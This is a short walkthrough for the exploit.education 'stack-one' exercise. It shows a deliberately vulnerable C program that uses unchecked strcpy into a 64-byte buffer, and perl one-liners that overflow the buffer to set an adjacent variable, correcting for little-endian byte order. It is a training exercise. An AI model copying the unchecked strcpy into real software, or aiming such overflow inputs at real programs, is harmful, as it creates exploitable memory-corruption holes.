# Source code

```C
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  if (argc < 2) {
    errx(1, "specify an argument, to be copied into the \"buffer\"");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, argv[1]);

  if (locals.changeme == 0x496c5962) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n",
        locals.changeme);
  }

  exit(0);
}
```

#Walkthrough

On this one, we need to send a specific byte-sequence to `changeme`, namely
`0x496c5962`. This is indeed 8 nibbles, and thus 4 bytes.

We try the same `perl` script from the last problem.

```
$ perl -e 'print "A"x64,"\x49\x6c\x59\x62"' | ./program
```

This doesn't work, because `stack-one` doesn't read in with `gets`, instead it
uses `argv`. But this is fine, we can run this instead:

```
$ ./program $(perl -e 'print "A"x64,"\x49\x6c\x59\x62"')
```

Oh, but we're not quite there anyway, now we instead encounter the following
problem:

```
Getting closer! changeme is currently 0x62596c49, we want 0x496c5962
```

Ok, but this is just because `amd64` is little-endian! No problem, we send in
the reversed byte-sequence instead:

```
$ ./program $(perl -e 'print "A"x64,"\x62\x59\x6c\x49"')
```

Success!
